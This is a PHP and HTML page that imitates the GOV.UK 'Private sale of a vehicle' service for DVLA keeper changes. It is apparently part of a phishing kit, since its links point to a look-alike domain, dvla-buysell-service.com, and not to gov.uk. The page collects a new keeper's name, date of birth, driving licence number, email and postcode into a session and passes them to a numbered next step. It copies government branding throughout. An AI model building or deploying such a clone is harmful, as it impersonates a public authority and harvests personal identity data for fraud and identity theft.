<?php
// Start session
session_start();

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Collect and sanitize form inputs
    $title = htmlspecialchars($_POST['privatekeeper_title.titleOption']);
    $otherTitle = htmlspecialchars($_POST['privatekeeper_title.titleText']);
    $firstName = htmlspecialchars($_POST['privatekeeper_firstname']);
    $lastName = htmlspecialchars($_POST['privatekeeper_lastname'] );
    $day = htmlspecialchars($_POST['privatekeeper_dateofbirth.day']);
    $month = htmlspecialchars($_POST['privatekeeper_dateofbirth.month']);
    $year = htmlspecialchars($_POST['privatekeeper_dateofbirth.year']);
    $licenseNumber = htmlspecialchars($_POST['privatekeeper_drivernumber']);
    $emailConfirmation = htmlspecialchars($_POST['privatekeeper_option_email']);
    $email = htmlspecialchars($_POST['privatekeeper_email.email']);
    $emailVerify = htmlspecialchars($_POST['privatekeeper_email.email-verify']);
    $postcode = htmlspecialchars($_POST['privatekeeper_postcode']);

    
    $_SESSION['privatekeeper_title.titleOption'] = $_POST['privatekeeper_title.titleOption'];
    $_SESSION['privatekeeper_title.titleText'] = $_POST['privatekeeper_title.titleText'];
    $_SESSION['privatekeeper_firstname'] = $_POST['privatekeeper_firstname'];
    $_SESSION['privatekeeper_lastname'] = $_POST['privatekeeper_lastname'];
    $_SESSION['privatekeeper_dateofbirth.day'] = $_POST['privatekeeper_dateofbirth.day'];
    $_SESSION['privatekeeper_dateofbirth.month'] = $_POST['privatekeeper_dateofbirth.month'];
    $_SESSION['privatekeeper_dateofbirth.year'] = $_POST['privatekeeper_dateofbirth.year'];
    $_SESSION['privatekeeper_drivernumber'] = $_POST['privatekeeper_drivernumber'];
    $_SESSION['privatekeeper_option_email'] = $_POST['privatekeeper_option_email'];
    $_SESSION['privatekeeper_option_email'] = $_POST['privatekeeper_email.email'];
    $_SESSION['privatekeeper_email.email-verify'] = $_POST['privatekeeper_email.email-verify'];
    
    $_SESSION['privatekeeper_postcode'] = $_POST['privatekeeper_postcode'];
    

    // Redirect or display a success message
   //  header("Location: success.php");
    exit;
}
?>

<!DOCTYPE html>
<html>

<head>
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <!--<base href="#">-->
   <base href=".">
   <meta name="download_date" content="2024-01-08T12:13:15.034Z">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Enter new keeper details - Private sale of a vehicle - GOV.UK</title>
   <link href="./styles.css" rel="stylesheet" type="text/css" />
   <link href="../style.css" rel="stylesheet" type="text/css" />
   <!-- <link href="../first/style.css" rel="stylesheet" type="text/css" /> -->
   <link rel="shortcut icon" href="https://dvla-buysell-service.com/buysell-service/next/newkeep.php#"
      type="image/x-icon">
   <link rel="apple-touch-icon-precomposed" href="https://dvla-buysell-service.com/buysell-service/next/newkeep.php#">
   <link rel="apple-touch-icon-precomposed" href="https://dvla-buysell-service.com/buysell-service/next/newkeep.php#"
      sizes="72x72">
   <link rel="apple-touch-icon-precomposed" href="https://dvla-buysell-service.com/buysell-service/next/newkeep.php#"
      sizes="76x76">
   <link rel="apple-touch-icon-precomposed" href="https://dvla-buysell-service.com/buysell-service/next/newkeep.php#"
      sizes="114x114">
   <link rel="apple-touch-icon-precomposed" href="https://dvla-buysell-service.com/buysell-service/next/newkeep.php#"
      sizes="120x120">
   <link rel="apple-touch-icon-precomposed" href="https://dvla-buysell-service.com/buysell-service/next/newkeep.php#"
      sizes="144x144">
   <link rel="apple-touch-icon-precomposed" href="https://dvla-buysell-service.com/buysell-service/next/newkeep.php#"
      sizes="152x152">
   <!-- Google Analytics - Universal (support ends 1/7/2024)-->
   <!-- End Google Analytics Universal -->
   <!-- Google Tag Manager -->
   <!-- End Google Tag Manager -->
   <!--<base href="#">-->
   <base href=".">
</head>

<body class="js-enabled vsc-initialized" data-closing-time="1140">
   <!-- Google Tag Manager (noscript) -->
   <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WVJJC8C8" height="0" width="0"
         style="display:none;visibility:hidden"></iframe></noscript>
   <!-- End Google Tag Manager (noscript) -->
   <div id="global-cookie-message">
      <div class="cookie-message-wrapper">
         <p>GOV.UK uses cookies to make the site simpler.&nbsp;<a
               href="https://dvla-buysell-service.com/buysell-service/next/newkeep.php#">Find out more about cookies</a>
         </p>
      </div>
   </div>
   <a href="https://dvla-buysell-service.com/buysell-service/next/newkeep.php#" class="govuk-skip-link">Skip to main
      content</a>
   <header class="govuk-header " role="banner" data-module="govuk-header">
      <div class="govuk-header__container govuk-width-container">
         <div class="govuk-header__logo">
            <a class="govuk-header__link govuk-header__link--homepage" data-track-action="logoLink"
               data-track-category="headerClicked" data-track-label="https://www.gov.uk" data-track-dimension="GOV.UK"
               data-track-dimension-index="29"
               data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;header menu bar&quot;,&quot;external&quot;:&quot;false&quot;,&quot;text&quot;:&quot;GOV.UK&quot;,&quot;section&quot;:&quot;Logo&quot;,&quot;index_link&quot;:1,&quot;index_section&quot;:0,&quot;index_section_count&quot;:2,&quot;index_total&quot;:1}"
               id="logo" aria-label="Go to the GOV.UK homepage" href="#" https:="" www.gov.uk"="">
               <span class="govuk-header__logotype">
                  <!--[if gt IE 8]><!-->
                 
                  <!--<![endif]-->
                  <!-- [if IE 8]> -->
                  <img src="./assets/logo.svg" style="filter: invert(100%);" alt=""
                     class="govuk-header__logotype-crown-fallback-image mb-3" width="36" height="32">
                  <!-- <![endif] -->
                  <span class="govuk-header__logotype-text" style="color: white;">
                     GOV.UK
                  </span>
               </span>
            </a>
         </div>
         <div class="govuk-header__content">
            <a href="" style="font-size: 25px !important; font-weight: 500 !important;"
               class="govuk-header__link govuk-header__service-name govuk-header-m-white">
               Private sale of a vehicle
            </a>
         </div>
      </div>
   </header>
   <div id="main">
      <div class="govuk-width-container">
         <div class="govuk-phase-banner">
            <p class="govuk-phase-banner__content">
               <strong class="govuk-tag govuk-phase-banner__content__tag">
                  beta
               </strong>
               <span class="govuk-phase-banner__text">
                  This is a new service -
                  <a class="govuk-link" id="feedback-open"
                     href="https://dvla-buysell-service.com/buysell-service/next/newkeep.php#" target="_blank">your
                     feedback</a>
                  will help us to improve it
               </span>
            </p>
         </div>
         <div class="section-content">
            <a class="govuk-back-link" id="back"
               href="https://dvla-buysell-service.com/buysell-service/next/newkeep.php#">Back</a>
            <script>
               document.getElementById('back').addEventListener('click', function () {
                  history.back();
               });
            </script>
         </div>
         <main class="govuk-main-wrapper" id="main-content">
            <div class="app vehicles-change-keeper-online">
               <form action="./3 - Select new keeper address - Private sale of a vehicle - GOV.UK.php" method="POST"
                  style="position: relative;" data-gtm-form-interact-id="0">
                  <div class="two-col clearfix">
                     <div class="first-col">
                        <h1 class="mobile-only">Enter new keeper details</h1>
                        <div class="playback">
                           <h2>Vehicle details</h2>
                           <dl>
                              <dt>Registration number</dt>
                              <dd>
                                 <span class="reg-number"><?php echo $_SESSION['v_registration'];?></span>
                              </dd>
                              <dt>Make</dt>
                              <dd>MERCEDES-BENZ</dd>
                              <dt>Model</dt>
                              <dd>GLC</dd>
                           </dl>
                        </div>
                        <div style="font-weight:bold;" class="govuk-warning-text">
                           <span class="govuk-warning-text__icon" aria-hidden="true">!</span>
                           <strong class="govuk-warning-text__text">
                              <span class="govuk-warning-text__assistive">Warning</span>
                              <p><strong>If the vehicle details shown are incorrect please abandon this transaction and
                                    send the V5C registration certificate (logbook) with a covering letter to DVLA,
                                    Swansea, SA99 1BA.</strong>
                              </p>
                           </strong>
                        </div>
                     </div>
                     <div class="second-col">
                        <h1>Enter new keeper details</h1>
                        <p>These should be the details of the person you sold the vehicle to. We will use these details
                           to update our records and issue a new V5C registration certificate (logbook).
                        </p>
                        <div class="uppercase-input">
                           <div class="form-item">
                              <div class="title-radio-wrapper" id="privatekeeper_title">
                                 <div class="form-item">
                                    <fieldset>
                                       <legend>
                                          Title
                                       </legend>
                                       <div id="privatekeeper_title_titleOption">
                                          <div class="form-item">
                                             <div class="govuk-radios__item">
                                                <input class="govuk-radios__input form-radio selectable" type="radio"
                                                   id="privatekeeper_title_titleOption_1"
                                                   name="privatekeeper_title.titleOption" value="Mr" showerrors="false"
                                                   data-gtm-form-interact-field-id="0" required="">
                                                <label class="govuk-label govuk-radios__label"
                                                   for="privatekeeper_title_titleOption_1">
                                                   <span class="text">Mr</span>
                                                </label>
                                             </div>
                                             <div class="govuk-radios__item">
                                                <input class="govuk-radios__input form-radio selectable" type="radio"
                                                   id="privatekeeper_title_titleOption_2"
                                                   name="privatekeeper_title.titleOption" value="Mrs" showerrors="false"
                                                   required="">
                                                <label class="govuk-label govuk-radios__label"
                                                   for="privatekeeper_title_titleOption_2">
                                                   <span class="text">Mrs</span>
                                                </label>
                                             </div>
                                             <div class="govuk-radios__item">
                                                <input class="govuk-radios__input form-radio selectable" type="radio"
                                                   id="privatekeeper_title_titleOption_3"
                                                   name="privatekeeper_title.titleOption" value="Miss"
                                                   showerrors="false" required="">
                                                <label class="govuk-label govuk-radios__label"
                                                   for="privatekeeper_title_titleOption_3">
                                                   <span class="text">Miss</span>
                                                </label>
                                             </div>
                                             <div class="govuk-radios__item">
                                                <input class="govuk-radios__input form-radio selectable" type="radio"
                                                   id="privatekeeper_title_titleOption_4"
                                                   name="privatekeeper_title.titleOption" value="" showerrors="false"
                                                   required="">
                                                <label class="govuk-label govuk-radios__label"
                                                   for="privatekeeper_title_titleOption_4">
                                                   <span class="text">Other</span>
                                                </label>
                                             </div>
                                          </div>
                                       </div>
                                    </fieldset>
                                 </div>
                              </div>
                              <div class="associated-input-wrapper no-js-only" style="">
                                 <div class="form-item">
                                    <label for="privatekeeper_title_titleText">
                                       Other title
                                    </label>
                                    <span class="form-hint" id="privatekeeper_title_titleText-hint">(10 characters
                                       maximum)</span>
                                    <input class="govuk-input" id="privatekeeper_title_titleText"
                                       name="privatekeeper_title.titleText" value="" type="text" maxlength="10"
                                       autocomplete="off" aria-describedby="privatekeeper_title_titleText-hint">
                                 </div>
                                 <span class="form-hint"></span>
                              </div>
                           </div>
                        </div>
                        <div class="uppercase-input">
                           <div class="form-item">
                              <label for="privatekeeper_firstname">
                                 First name(s)
                              </label>
                              <input class="govuk-input" id="privatekeeper_firstname" required=""
                                 name="privatekeeper_firstname" value="" type="text" maxlength="26" autocomplete="off"
                                 data-gtm-form-interact-field-id="1">
                           </div>
                        </div>
                        <div class="uppercase-input">
                           <div class="form-item">
                              <label for="privatekeeper_lastname">
                                 Last name
                              </label>
                              <input class="govuk-input" id="privatekeeper_lastname" required=""
                                 name="privatekeeper_lastname" value="" type="text" maxlength="25" autocomplete="off"
                                 data-gtm-form-interact-field-id="2">
                           </div>
                        </div>
                        <div class="form-item">
                           <label for="privatekeeper_dateofbirth">
                              Date of birth
                              <span>(optional)</span>
                           </label>
                           <span class="form-hint" id="privatekeeper_dateofbirth-hint">For example, 01 03 1976</span>
                           <div class="form-inline form-date  ga-track-optional-text " data-ga-action="date_of_birth">
                              <div class="form-item" style="display: flex;">
                                 <div class="form-item">
                                    <label for="privatekeeper_dateofbirth_day">
                                       Day
                                    </label>
                                    <input id="privatekeeper_dateofbirth_day" name="privatekeeper_dateofbirth.day"
                                       value="" type="text" pattern="[0-9]*" inputmode="numeric"
                                       aria-describedby="privatekeeper_dateofbirth-hint"
                                       onkeypress="check(event, this, /[0-9]/);" no_optional_label="true"
                                       class="govuk-input govuk-date-input__input govuk-input--width-2"
                                       autocomplete="off" maxlength="2" data-gtm-form-interact-field-id="3">
                                 </div>
                                 <div class="form-item">
                                    <label for="privatekeeper_dateofbirth_month">
                                       Month
                                    </label>
                                    <input id="privatekeeper_dateofbirth_month" name="privatekeeper_dateofbirth.month"
                                       value="" type="text" pattern="[0-9]*" inputmode="numeric"
                                       onkeypress="check(event, this, /[0-9]/);" no_optional_label="true"
                                       class="govuk-input govuk-date-input__input govuk-input--width-2"
                                       autocomplete="off" maxlength="2" data-gtm-form-interact-field-id="4">
                                 </div>
                                 <div class="form-item">
                                    <label for="privatekeeper_dateofbirth_year">
                                       Year
                                    </label>
                                    <input id="privatekeeper_dateofbirth_year" name="privatekeeper_dateofbirth.year"
                                       value="" type="text" pattern="[0-9]*" inputmode="numeric"
                                       onkeypress="check(event, this, /[0-9]/);" no_optional_label="true"
                                       class="govuk-input govuk-date-input__input govuk-input--width-4"
                                       autocomplete="off" maxlength="4" data-gtm-form-interact-field-id="5">
                                 </div>
                              </div>
                           </div>
                        </div>
                        <div class="uppercase-input">
                           <div class="form-item">
                              <label for="privatekeeper_drivernumber">
                                 Driving licence number of new keeper
                                 <span>(optional)</span>
                              </label>
                              <span class="form-hint" id="privatekeeper_drivernumber-hint">For example,
                                 MORGA657054SM9IJ</span>
                              <input class="govuk-input" id="privatekeeper_drivernumber"
                                 name="privatekeeper_drivernumber" value="" type="text" data-ga-action="driving_licence"
                                 optionalfieldkey="true" aria-describedby="privatekeeper_drivernumber-hint"
                                 autocomplete="off" maxlength="16">
                           </div>
                        </div>
                        <div id="privatekeeper_option_email">
                           <div class="govuk-form-group">
                              <fieldset class="govuk-fieldset">
                                 <legend>Does the new keeper want an email confirmation of the sale?</legend>
                                 <div class="govuk-radios govuk-radios--conditional" data-module="govuk-radios">
                                    <div class="govuk-radios__item">
                                       <input class="govuk-radios__input ga-track-value"
                                          data-ga-action="privatekeeper_option_email" data-ga-label="provided"
                                          data-target="#privatekeeper_option_email"
                                          id="privatekeeper_option_email_visible" name="privatekeeper_option_email"
                                          value="visible" showerrors="false" type="radio"
                                          aria-controls="conditional-privatekeeper_option_email" aria-expanded="false">
                                       <label class="govuk-label govuk-radios__label"
                                          for="privatekeeper_option_email_visible">
                                          Yes
                                       </label>
                                    </div>
                                    <div class="govuk-radios__conditional govuk-radios__conditional--hidden"
                                       id="conditional-privatekeeper_option_email">
                                       <div class="govuk-form-group">
                                          <div class="form-item">
                                             <div id="privatekeeper_email">
                                                <div class="form-item">
                                                   <label for="privatekeeper_email_email">
                                                      Email address of new keeper
                                                   </label>
                                                   <input class="govuk-input" id="privatekeeper_email_email"
                                                      name="privatekeeper_email.email" value="" type="text"
                                                      no_optional_label="true" maxlength="254" autocomplete="off">
                                                </div>
                                                <div class="form-item">
                                                   <label for="privatekeeper_email_email-verify">
                                                      Confirm email address
                                                   </label>
                                                   <input class="govuk-input js-email-confirm"
                                                      id="privatekeeper_email_email-verify"
                                                      name="privatekeeper_email.email-verify" value="" type="text"
                                                      no_optional_label="true" autocomplete="off" maxlength="254">
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                    <div class="govuk-radios__item">
                                       <input class="govuk-radios__input ga-track-value"
                                          data-ga-action="privatekeeper_option_email" data-ga-label="absent"
                                          data-target="#privatekeeper_option_email"
                                          id="privatekeeper_option_email_invisible" name="privatekeeper_option_email"
                                          value="invisible" showerrors="false" type="radio"
                                          data-aria-controls="conditional-privatekeeper_option_email-2">
                                       <label class="govuk-label govuk-radios__label"
                                          for="privatekeeper_option_email_invisible">
                                          No
                                       </label>
                                    </div>
                                 </div>
                              </fieldset>
                           </div>
                        </div>
                        <script>
                           document.addEventListener('DOMContentLoaded', function () {
                              var yesRadio = document.getElementById('privatekeeper_option_email_visible');
                              var noRadio = document.getElementById('privatekeeper_option_email_invisible');
                              var conditionalContainer = document.getElementById('conditional-privatekeeper_option_email');

                              // Check if the radio buttons and container exist
                              if (yesRadio && noRadio && conditionalContainer) {
                                 // Add an event listener to the "Yes" radio button
                                 yesRadio.addEventListener('change', function () {
                                    // Check if the "Yes" radio button is checked
                                    if (yesRadio.checked) {
                                       // Display the conditional container
                                       conditionalContainer.style.display = 'block';
                                    } else {
                                       // Hide the conditional container
                                       conditionalContainer.style.display = 'none';
                                    }
                                 });

                                 // Add an event listener to the "No" radio button
                                 noRadio.addEventListener('change', function () {
                                    // Check if the "No" radio button is checked
                                    if (noRadio.checked) {
                                       // Hide the conditional container
                                       conditionalContainer.style.display = 'none';
                                    }
                                 });
                              }
                           });
                        </script>
                        <div class="uppercase-input">
                           <div class="form-item">
                              <label for="privatekeeper_postcode">
                                 Postcode
                              </label>
                              <span class="form-hint" id="privatekeeper_postcode-hint">e.g. AB1 2BA or AB12BA</span>
                              <input class="govuk-input" id="privatekeeper_postcode" required=""
                                 name="privatekeeper_postcode" value="" type="text" maxlength="8" autocomplete="off"
                                 aria-describedby="privatekeeper_postcode-hint">
                           </div>
                        </div>

                     </div>
                  </div>
                  <div class="form-item">
                     <input class="govuk-button" id="mileage" style="font-size: 18px;" name="step-4" value="Continue"
                        type="submit" autocomplete="off" maxlength="6">
                  </div>
               </form>
            </div>
         </main>
      </div>
   </div>
   <footer class="gem-c-layout-footer govuk-footer gem-c-layout-footer--border" role="contentinfo"
      data-module="ga4-link-tracker" data-ga4-link-tracker-module-started="true">
      <div class="govuk-width-container">

         <div class="govuk-footer__meta">
            <div class="govuk-footer__meta-item govuk-footer__meta-item--grow">
               <h2 class="govuk-visually-hidden">Support links</h2>
               <ul class="govuk-footer__inline-list govuk-!-display-none-print" data-module="gem-track-click"
                  data-track-links-only="" data-gem-track-click-module-started="true">
                  <li class="govuk-footer__inline-list-item">
                     <a class="govuk-footer__link" data-track-category="footerClicked" data-track-action="supportLink"
                        data-track-label="/help" data-track-options="{&quot;dimension29&quot;:&quot;Help&quot;}"
                        data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;1&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                        href="#" https:="" www.gov.uk="" help"="">Help</a>
                  </li>
                  <li class="govuk-footer__inline-list-item">
                     <a class="govuk-footer__link" data-track-category="footerClicked" data-track-action="supportLink"
                        data-track-label="/help/privacy-notice"
                        data-track-options="{&quot;dimension29&quot;:&quot;Privacy&quot;}"
                        data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;2&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                        href="#" https:="" www.gov.uk="" help="" privacy-notice"="">Privacy</a>
                  </li>
                  <li class="govuk-footer__inline-list-item">
                     <a class="govuk-footer__link" data-track-category="footerClicked" data-track-action="supportLink"
                        data-track-label="/help/cookies"
                        data-track-options="{&quot;dimension29&quot;:&quot;Cookies&quot;}"
                        data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;3&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                        href="#" https:="" www.gov.uk="" help="" cookies"="">Cookies</a>
                  </li>
                  <li class="govuk-footer__inline-list-item">
                     <a class="govuk-footer__link" data-track-category="footerClicked" data-track-action="supportLink"
                        data-track-label="/help/accessibility-statement"
                        data-track-options="{&quot;dimension29&quot;:&quot;Accessibility statement&quot;}"
                        data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;4&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                        href="#" https:="" www.gov.uk="" help="" accessibility-statement"="">Accessibility statement</a>
                  </li>
                  <li class="govuk-footer__inline-list-item">
                     <a class="govuk-footer__link" data-track-category="footerClicked" data-track-action="supportLink"
                        data-track-label="/contact" data-track-options="{&quot;dimension29&quot;:&quot;Contact&quot;}"
                        data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;5&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                        href="#" https:="" www.gov.uk="" contact"="">Contact</a>
                  </li>
                  <li class="govuk-footer__inline-list-item">
                     <a class="govuk-footer__link" data-track-category="footerClicked" data-track-action="supportLink"
                        data-track-label="/help/terms-conditions"
                        data-track-options="{&quot;dimension29&quot;:&quot;Terms and conditions&quot;}"
                        data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;6&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                        href="#" https:="" www.gov.uk="" help="" terms-conditions"="">Terms and conditions</a>
                  </li>
                  <li class="govuk-footer__inline-list-item">
                     <a class="govuk-footer__link" lang="cy" data-track-category="footerClicked"
                        data-track-action="supportLink" data-track-label="/cymraeg"
                        data-track-options="{&quot;dimension29&quot;:&quot;Rhestr o Wasanaethau Cymraeg&quot;}"
                        data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;7&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                        href="#" https:="" www.gov.uk="" cymraeg"="">Rhestr
                        o Wasanaethau Cymraeg</a>
                  </li>
                  <li class="govuk-footer__inline-list-item">
                     <a class="govuk-footer__link" data-track-category="footerClicked" data-track-action="supportLink"
                        data-track-label="/government/organisations/government-digital-service"
                        data-track-options="{&quot;dimension29&quot;:&quot;Government Digital Service&quot;}"
                        data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;type&quot;:&quot;footer&quot;,&quot;index_link&quot;:&quot;8&quot;,&quot;index_section&quot;:&quot;3&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;index_total&quot;:&quot;8&quot;,&quot;section&quot;:&quot;Support links&quot;}"
                        href="#" https:="" www.gov.uk="" government="" organisations=""
                        government-digital-service"="">Government Digital Service</a>
                  </li>
               </ul>
               <svg aria-hidden="true" focusable="false" class="govuk-footer__licence-logo"
                  xmlns="http://www.w3.org/2000/svg" viewBox="0 0 483.2 195.7" height="17" width="41">
                  <path fill="currentColor"
                     d="M421.5 142.8V.1l-50.7 32.3v161.1h112.4v-50.7zm-122.3-9.6A47.12 47.12 0 0 1 221 97.8c0-26 21.1-47.1 47.1-47.1 16.7 0 31.4 8.7 39.7 21.8l42.7-27.2A97.63 97.63 0 0 0 268.1 0c-36.5 0-68.3 20.1-85.1 49.7A98 98 0 0 0 97.8 0C43.9 0 0 43.9 0 97.8s43.9 97.8 97.8 97.8c36.5 0 68.3-20.1 85.1-49.7a97.76 97.76 0 0 0 149.6 25.4l19.4 22.2h3v-87.8h-80l24.3 27.5zM97.8 145c-26 0-47.1-21.1-47.1-47.1s21.1-47.1 47.1-47.1 47.2 21 47.2 47S123.8 145 97.8 145">
                  </path>
               </svg>
               <span class="govuk-footer__licence-description" data-module="gem-track-click"
                  data-track-action="copyrightLink" data-track-category="footerClicked"
                  data-track-label="https://www.nationalarchives.gov.uk/doc/open-government-licence/version/3/"
                  data-track-options="{&quot;dimension29&quot;: &quot;Open Government Licence v3.0&quot;}"
                  data-track-links-only="" data-ga4-track-links-only=""
                  data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;section&quot;:&quot;Licence&quot;,&quot;index_section&quot;:&quot;4&quot;,&quot;index_link&quot;:&quot;1&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;text&quot;:&quot;Open Government Licence v3.0&quot;,&quot;index_total&quot;:&quot;1&quot;,&quot;type&quot;:&quot;footer&quot;}"
                  data-gem-track-click-module-started="true">
                  All content is available under the <a class="govuk-footer__link" href="#" https:=""
                     www.nationalarchives.gov.uk="" doc="" open-government-licence="" version="" 3="" "="" rel="
                     license">Open Government Licence v3.0</a>,
                  except where otherwise stated
               </span>
            </div>
            <div class="govuk-footer__meta-item" data-module="gem-track-click" data-track-action="copyrightLink"
               data-track-category="footerClicked"
               data-track-label="https://www.nationalarchives.gov.uk/information-management/re-using-public-sector-information/uk-government-licensing-framework/crown-copyright/"
               data-track-options="{&quot;dimension29&quot;: &quot;© Crown copyright&quot;}" data-track-links-only=""
               data-ga4-link="{&quot;event_name&quot;:&quot;navigation&quot;,&quot;section&quot;:&quot;Copyright&quot;,&quot;index_section&quot;:&quot;5&quot;,&quot;index_link&quot;:&quot;1&quot;,&quot;index_section_count&quot;:&quot;5&quot;,&quot;text&quot;:&quot;© Crown copyright&quot;,&quot;index_total&quot;:&quot;1&quot;,&quot;type&quot;:&quot;footer&quot;}"
               data-gem-track-click-module-started="true">
               <a class="govuk-footer__link govuk-footer__copyright-logo" href="#" https:=""
                  www.nationalarchives.gov.uk="" information-management="" re-using-public-sector-information=""
                  uk-government-licensing-framework="" crown-copyright="" "="">© Crown copyright</a>
               </div>
            </div>
         </div>
      </footer>
      <div id=" global-app-error" class="app-error hidden">
            </div>
</body>

</html>